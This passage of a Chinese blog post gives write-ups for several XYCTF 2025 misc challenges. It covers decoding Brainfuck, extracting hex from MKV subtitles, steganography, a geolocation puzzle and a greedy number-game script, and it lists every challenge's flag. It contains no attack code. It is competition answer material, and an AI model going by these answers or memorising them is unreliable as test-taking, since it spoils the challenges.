<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">brainfuck_interpreter</span>(<span class="params">code</span>):</span><br><span class="line">    tape = [<span class="number">0</span>] * <span class="number">30000</span></span><br><span class="line">    ptr = <span class="number">0</span></span><br><span class="line">    pc = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    bracket_map = &#123;&#125;</span><br><span class="line">    stack = []</span><br><span class="line">    <span class="keyword">for</span> pos, cmd <span class="keyword">in</span> <span class="built_in">enumerate</span>(code):</span><br><span class="line">        <span class="keyword">if</span> cmd == <span class="string">&#x27;[&#x27;</span>:</span><br><span class="line">            stack.append(pos)</span><br><span class="line">        <span class="keyword">elif</span> cmd == <span class="string">&#x27;]&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> stack:</span><br><span class="line">                start = stack.pop()</span><br><span class="line">                bracket_map[start] = pos</span><br><span class="line">                bracket_map[pos] = start</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> pc &lt; <span class="built_in">len</span>(code):</span><br><span class="line">        cmd = code[pc]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> cmd == <span class="string">&#x27;&gt;&#x27;</span>:</span><br><span class="line">            ptr += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> cmd == <span class="string">&#x27;&lt;&#x27;</span>:</span><br><span class="line">            ptr -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> cmd == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">            tape[ptr] = (tape[ptr] + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        <span class="keyword">elif</span> cmd == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">            tape[ptr] = (tape[ptr] - <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        <span class="keyword">elif</span> cmd == <span class="string">&#x27;[&#x27;</span> <span class="keyword">and</span> tape[ptr] == <span class="number">0</span>:</span><br><span class="line">            pc = bracket_map[pc]</span><br><span class="line">        <span class="keyword">elif</span> cmd == <span class="string">&#x27;]&#x27;</span> <span class="keyword">and</span> tape[ptr] != <span class="number">0</span>:</span><br><span class="line">            pc = bracket_map[pc]</span><br><span class="line"></span><br><span class="line">        pc += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    message = []</span><br><span class="line">    <span class="keyword">for</span> cell <span class="keyword">in</span> tape:</span><br><span class="line">        <span class="keyword">if</span> cell == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">        message.append(<span class="built_in">chr</span>(cell))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(message)</span><br><span class="line"></span><br><span class="line">code = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&gt;+++++++++++++++++[&lt;++++++&gt;-]&gt;++++++++++++[&lt;+++++++++&gt;-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-]&gt;+++++++++++++++++++++++++++++++++++++++++[&lt;+++&gt;-]&gt;+++++++++++++++++++++++++++++[&lt;+++&gt;-]&gt;+++++++++++++++++[&lt;+++&gt;-]&gt;++++++++++++[&lt;+++++++++&gt;-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-]&gt;++++++++[&lt;++++++&gt;-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-]&gt;+++++++++++++++++++[&lt;+++++&gt;-]&gt;+++++++++++++++++++++++++++++[&lt;++++&gt;-]&gt;++++++++[&lt;++++++&gt;-]&gt;+++++++++++++++++++[&lt;+++++&gt;-]&gt;+++++++++++[&lt;++++++++&gt;-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-]&gt;++++++++++++[&lt;+++++++&gt;-]&gt;++++++++++[&lt;+++++++&gt;-]&gt;+++++++++++++++++++[&lt;+++++&gt;-]&gt;++++++++++[&lt;+++++&gt;-]&gt;++++++++[&lt;++++++&gt;-]&gt;++++++++++[&lt;+++++&gt;-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-]&gt;+++++++++++++++++++[&lt;+++++&gt;-]&gt;+++++++++++++++++++++++[&lt;+++&gt;-]&gt;+++++++++++[&lt;++++++++++&gt;-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;++&gt;-]&gt;++++++++[&lt;++++++&gt;-]&gt;+++++++++++[&lt;+++++&gt;-]&gt;+++++++++++++++++++[&lt;+++++&gt;-]&gt;+++++++[&lt;+++++++&gt;-]&gt;+++++++++++++++++++++++++++++[&lt;++++&gt;-]&gt;+++++++++++[&lt;+++&gt;-]&gt;+++++++++++++++++++++++++[&lt;+++++&gt;-]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">clean_code = <span class="string">&#x27;&#x27;</span>.join(c <span class="keyword">for</span> c <span class="keyword">in</span> code <span class="keyword">if</span> c <span class="keyword">in</span> [<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;]&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># Run the interpreter and get the message</span></span><br><span class="line">message = brainfuck_interpreter(clean_code)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decoded Message:&quot;</span>, message)</span><br></pre></td></tr></table></figure></div>
<p>7.得到</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./xyctf2025wp/image-20250406220901136-1743953974506-82.png"
                      alt="image-20250406220901136" style="zoom:50%;" 
                ></p>
<p>flag 值：flag{W3lC0me_t0_XYCTF_2025_Enj07_1t!}</p>
<h4 id="misc-mader也要当ctfer">misc-MADer也要当CTFer</h4>
<p>是个mkv文件，打开只有十几秒的视频，但是下面时长5小时，肯定有问题</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406233620326.png"
                      class=""
                >
<p>然后看到后缀是mkv，搜一下这个mkv能封装视频、音频、字幕文件，下个小工具箱导出文件</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-211623.png"
                      class=""
                >
<p>有个字幕.ass文件</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-211633.png"
                      class=""
                >
<p>后面的text字段是标准的16进制，写个脚本提取</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;只是刚好情窦初开遇到你.ass&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    lines = f.readlines()</span><br><span class="line"></span><br><span class="line">dialogue_lines = [line <span class="keyword">for</span> line <span class="keyword">in</span> lines <span class="keyword">if</span> line.startswith(<span class="string">&quot;Dialogue:&quot;</span>)]</span><br><span class="line"></span><br><span class="line">texts = []</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> dialogue_lines:</span><br><span class="line">    parts = line.strip().split(<span class="string">&quot;,&quot;</span>, <span class="number">9</span>)  <span class="comment"># ASS 字幕 text 是第10个字段（索引9）</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(parts) &gt;= <span class="number">10</span>:</span><br><span class="line">        texts.append(parts[<span class="number">9</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存为 txt</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;subtitle_texts.txt&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> out:</span><br><span class="line">    <span class="keyword">for</span> text <span class="keyword">in</span> texts:</span><br><span class="line">        out.write(text + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;提取完成，共 <span class="subst">&#123;<span class="built_in">len</span>(texts)&#125;</span> 行字幕文本。&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>提取出来直接导入16进制文件</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-211742.png"
                      class=""
                >
<p>文件头是rifx，搜了一下是个ae的文件，是.aep，但是我的ae打不开。。。。就直接在线预览，搜了一下flag</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-212051.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-212100.png"
                      class=""
                >
<p>只有这俩，但是说明flag肯定在，找找又发现</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-212153.png"
                      class=""
                >
<p>发现他们都在这个左边，我就直接慢慢看左边，没看到，最后我用记事本按这个方法找到了，不知道为什么在线预览没有，在记事本里他们前面的字符都一样我就这样找到的</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-212838.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-212850.png"
                      class=""
                >
<p>得到flag<code>flag&#123;l_re@IIy_w@nn@_2_Ie@rn_AE&#125;</code></p>
<h4 id="misc-会飞的雷克萨斯">misc-会飞的雷克萨斯</h4>
<p>看到这个题目就知道答案了，大名鼎鼎的四川小孩，嘻嘻，但是我刚开始以为是找左边三位小数md5加密（我没加群！！！！！！）。下次flag形式发题目描述里吧，求求你。</p>
<p>现在dy搜一下这件事，是四川省内江市资中县的事情<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-220144.png"
                      class=""
                ></p>
<p>地图直接搜<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-220308.png"
                      class=""
                ></p>
<p>得到flag<code>flag&#123;四川省内江市资中县春岚北路城市中心内&#125;</code></p>
<h4 id="misc-曼波曼波曼波">misc-曼波曼波曼波</h4>
<p>qr码是假的</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-213510.png"
                      class=""
                >
<p>有一个smn.txt，看起来就像是要base64转图片（赛马娘），但是=在前面说明应该是需要逆序，直接在线逆序！！！！</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-213557.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-213852.png"
                      class=""
                >
<p>然后b64转图片</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-213948.png"
                      class=""
                >
<p>得到图片</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-213953.png"
                      class=""
                >
<p>然后就是正常的隐写，foremost/binwalk分离</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-214337.png"
                      class=""
                >
<p>里面是个zip，解压一张老隐写图和一段提示解压zip，密码<code>XYCTF2025</code></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-214419.png"
                      class=""
                >
<p>俩看起来一样的图，直接blindwatermark分离！！！！！</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-215124.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-215158.png"
                      class=""
                >
<p>得到flag<code>XYCTF&#123;easy_yin_xie_dfbfuj877&#125;</code></p>
<h4 id="misc-greedymen">misc-Greedymen</h4>
<p>这个写个脚本直接出</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_factors</span>(<span class="params">n</span>):</span><br><span class="line">    factors = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">int</span>(math.sqrt(n)) + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> n % i == <span class="number">0</span>:</span><br><span class="line">            factors.add(i)</span><br><span class="line">            <span class="keyword">if</span> i != <span class="number">1</span> <span class="keyword">and</span> i != n // i:</span><br><span class="line">                factors.add(n // i)</span><br><span class="line">    factors.discard(n)</span><br><span class="line">    <span class="keyword">return</span> factors</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">simulate_game</span>(<span class="params">level_max, counter</span>):</span><br><span class="line">    board = &#123;i: <span class="string">&#x27;unassigned&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, level_max + <span class="number">1</span>)&#125;</span><br><span class="line">    my_score = <span class="number">0</span></span><br><span class="line">    opponent_score = <span class="number">0</span></span><br><span class="line">    steps = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> counter &gt; <span class="number">0</span>:</span><br><span class="line">        best_choice = <span class="literal">None</span></span><br><span class="line">        best_net_gain = <span class="built_in">float</span>(<span class="string">&#x27;-inf&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, level_max + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> board[num] != <span class="string">&#x27;unassigned&#x27;</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            factors = get_factors(num)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">all</span>(board[f] != <span class="string">&#x27;unassigned&#x27;</span> <span class="keyword">for</span> f <span class="keyword">in</span> factors):</span><br><span class="line">                <span class="keyword">continue</span>  <span class="comment"># can&#x27;t pick this number, all factors already chosen</span></span><br><span class="line"></span><br><span class="line">            gain = num</span><br><span class="line">            cost = <span class="built_in">sum</span>(f <span class="keyword">for</span> f <span class="keyword">in</span> factors <span class="keyword">if</span> board[f] == <span class="string">&#x27;unassigned&#x27;</span>)</span><br><span class="line">            net_gain = gain - cost</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> net_gain &gt; best_net_gain:</span><br><span class="line">                best_net_gain = net_gain</span><br><span class="line">                best_choice = num</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> best_choice <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">break</span>  <span class="comment"># no more valid moves</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Assign number to self</span></span><br><span class="line">        board[best_choice] = <span class="string">&#x27;me&#x27;</span></span><br><span class="line">        my_score += best_choice</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Assign its unassigned factors to opponent</span></span><br><span class="line">        <span class="keyword">for</span> f <span class="keyword">in</span> get_factors(best_choice):</span><br><span class="line">            <span class="keyword">if</span> board[f] == <span class="string">&#x27;unassigned&#x27;</span>:</span><br><span class="line">                board[f] = <span class="string">&#x27;opponent&#x27;</span></span><br><span class="line">                opponent_score += f</span><br><span class="line"></span><br><span class="line">        counter -= <span class="number">1</span></span><br><span class="line">        steps.append(<span class="string">f&quot;Choose <span class="subst">&#123;best_choice&#125;</span>: +<span class="subst">&#123;best_choice&#125;</span> (Opponent gets factors <span class="subst">&#123;get_factors(best_choice)&#125;</span>)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Assign remaining numbers to opponent</span></span><br><span class="line">    <span class="keyword">for</span> num, status <span class="keyword">in</span> board.items():</span><br><span class="line">        <span class="keyword">if</span> status == <span class="string">&#x27;unassigned&#x27;</span>:</span><br><span class="line">            board[num] = <span class="string">&#x27;opponent&#x27;</span></span><br><span class="line">            opponent_score += num</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="string">&#x27;steps&#x27;</span>: steps,</span><br><span class="line">        <span class="string">&#x27;my_score&#x27;</span>: my_score,</span><br><span class="line">        <span class="string">&#x27;opponent_score&#x27;</span>: opponent_score,</span><br><span class="line">        <span class="string">&#x27;final_result&#x27;</span>: <span class="string">&#x27;Win&#x27;</span> <span class="keyword">if</span> my_score &gt; opponent_score <span class="keyword">else</span> <span class="string">&#x27;Lose&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;difference&#x27;</span>: my_score - opponent_score</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Simulate all 3 levels</span></span><br><span class="line">level1 = simulate_game(<span class="number">50</span>, <span class="number">19</span>)</span><br><span class="line">level2 = simulate_game(<span class="number">100</span>, <span class="number">37</span>)</span><br><span class="line">level3 = simulate_game(<span class="number">200</span>, <span class="number">76</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Saving the results into a text file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;game_simulation_results.txt&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="keyword">for</span> i, level <span class="keyword">in</span> <span class="built_in">enumerate</span>([level1, level2, level3], <span class="number">1</span>):</span><br><span class="line">        file.write(<span class="string">f&quot;Level <span class="subst">&#123;i&#125;</span>:\n&quot;</span>)</span><br><span class="line">        file.write(<span class="string">f&quot;Steps:\n&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> step <span class="keyword">in</span> level[<span class="string">&#x27;steps&#x27;</span>]:</span><br><span class="line">            file.write(<span class="string">f&quot;  <span class="subst">&#123;step&#125;</span>\n&quot;</span>)</span><br><span class="line">        file.write(<span class="string">f&quot;My Score: <span class="subst">&#123;level[<span class="string">&#x27;my_score&#x27;</span>]&#125;</span>\n&quot;</span>)</span><br><span class="line">        file.write(<span class="string">f&quot;Opponent Score: <span class="subst">&#123;level[<span class="string">&#x27;opponent_score&#x27;</span>]&#125;</span>\n&quot;</span>)</span><br><span class="line">        file.write(<span class="string">f&quot;Final Result: <span class="subst">&#123;level[<span class="string">&#x27;final_result&#x27;</span>]&#125;</span>\n&quot;</span>)</span><br><span class="line">        file.write(<span class="string">f&quot;Score Difference: <span class="subst">&#123;level[<span class="string">&#x27;difference&#x27;</span>]&#125;</span>\n\n&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>输出：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-221013.png"
                      class=""
                >
<p>整理得到</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">47, 49, 35, 39, 26, 46, 33, 45, 38, 44, 34, 50, 30, 28, 42, 40, 32, 24, 36</span><br><span class="line"></span><br><span class="line">97, 91, 95, 85, 77, 93, 62, 87, 99, 81, 94, 69, 86, 63, 92, 82, 66, 76, 74, 54,</span><br><span class="line">88, 75, 50, 100, 98, 70, 68, 56, 84, 60, 90, 52, 78, 80, 64, 48, 72</span><br><span class="line"></span><br><span class="line">199, 187, 169, 185, 161, 155, 183, 122, 177, 145, 175, 133, 159, 171, 153, 194, 141, 188, 178, 129,</span><br><span class="line">172, 166, 123, 164, 158, 117, 195, 130, 105, 189, 147, 135, 98, 196, 182, 165, 110, 154, 148, 146,</span><br><span class="line">78, 156, 104, 114, 190, 152, 142, 102, 170, 136, 134, 126, 124, 186, 90, 180, 140, 116, 174, 120,</span><br><span class="line">80, 160, 128, 112, 168, 108, 162, 100, 150, 96, 144, 92, 138, 88, 132, 198</span><br></pre></td></tr></table></figure></div>
<p>直接输入，连赢三局，得到flag</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-05-153311.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-05-153259.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-05-153137.png"
                      class=""
                >
<p>flag:<code>flag&#123;Greed, is......key of the life.&#125;</code></p>

		</div>

		
		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
			<div class="article-copyright-info-container">
    <ul>
        <li><strong>标题:</strong> 2025xyctf wp</li>
        <li><strong>作者:</strong> collectcrop</li>
        <li><strong>创建于
                :</strong> 2025-04-08 11:26:17</li>
        
            <li>
                <strong>更新于
                    :</strong> 2025-05-26 20:30:22
            </li>
        
        <li>
            <strong>链接:</strong> https://collectcrop.github.io/2025/04/08/2025xyctf-wp/
        </li>
        <li>
            <strong>
                版权声明:
            </strong>
            

            
                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
            
        </li>
    </ul>
</div>

		</div>
		

		
		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
			
			<li class="tag-item mx-0.5">
				<a href="/blog/tags/wp/">#wp</a>&nbsp;
			</li>
			
		</ul>
		

		
  <div class="recommended-article px-2 sm:px-6 md:px-8">
   <div class="recommended-desktop">
    <div class="recommended-article-header text-xl md:text-3xl font-bold mt-10">
     <i aria-hidden="true"></i><span>推荐阅读</span>
    </div>
    <div class="recommended-article-group"><a class="recommended-article-item" href="/blog/2025/05/26/litctf2025-writeup/" title="litctf2025 writeup" rel="bookmark">
  <img src="/images/wallhaven-wqery6-light.webp" alt="litctf2025 writeup" class="!max-w-none">
  <span class="title">litctf2025 writeup</span>
</a><a class="recommended-article-item" href="/blog/2024/09/21/webpwn/" title="webpwn" rel="bookmark">
  <img src="/images/wallhaven-wqery6-light.webp" alt="webpwn" class="!max-w-none">
  <span class="title">webpwn</span>
</a><a class="recommended-article-item" href="/blog/2024/10/03/house-of-force/" title="house_of_force" rel="bookmark">
  <img src="/images/wallhaven-wqery6-light.webp" alt="house_of_force" class="!max-w-none">
  <span class="title">house_of_force</span>
</a></div>
   </div>
   <div class="recommended-mobile">
   <div class="recommended-article-header text-xl md:text-3xl font-bold mt-10">
     <i aria-hidden="true"></i><span>推荐阅读</span>
   </div>
   <div class="recommended-article-group"><a class="recommended-article-item" href="/blog/2025/05/26/litctf2025-writeup/" title="litctf2025 writeup" rel="bookmark">
  <img src="/images/wallhaven-wqery6-light.webp" alt="litctf2025 writeup" class="!max-w-none">
  <span class="title">litctf2025 writeup</span>
</a><a class="recommended-article-item" href="/blog/2024/09/21/webpwn/" title="webpwn" rel="bookmark">
  <img src="/images/wallhaven-wqery6-light.webp" alt="webpwn" class="!max-w-none">
  <span class="title">webpwn</span>
</a></div>
   </div>
  </div>

		
